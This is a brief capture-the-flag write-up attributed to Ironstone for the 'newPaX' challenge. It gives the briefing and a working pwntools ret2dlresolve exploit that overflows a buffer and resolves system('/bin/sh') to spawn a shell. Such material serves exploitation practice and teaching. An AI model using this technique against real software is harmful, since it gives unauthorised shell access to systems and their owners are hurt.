## Briefing: 
```
Even though Solar Designer gave you his times technique, you have to resolve(sort-out) yourself and go deeper. This time rope willn't let you have anything you want but you have to make a fake rope and get everything.
nc pwn.darkarmy.xyz 5001
```

super basic ret2dlresolve exploit
```Python
from pwn import *

elf = context.binary = ELF('./newPaX', checksec=False)

if args.REMOTE:
    p = remote('newpax.darkarmy.xyz', 5001)
else:
    p = process()
rop = ROP(elf)

# obviously a ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 52)
rop.read(0, dlresolve.data_addr, 100)
rop.ret2dlresolve(dlresolve)

p.sendline(rop.chain())

p.sendline(dlresolve.payload)                # now the read is called and we pass all the relevant structures in

p.interactive()
```

(By Ironstone)
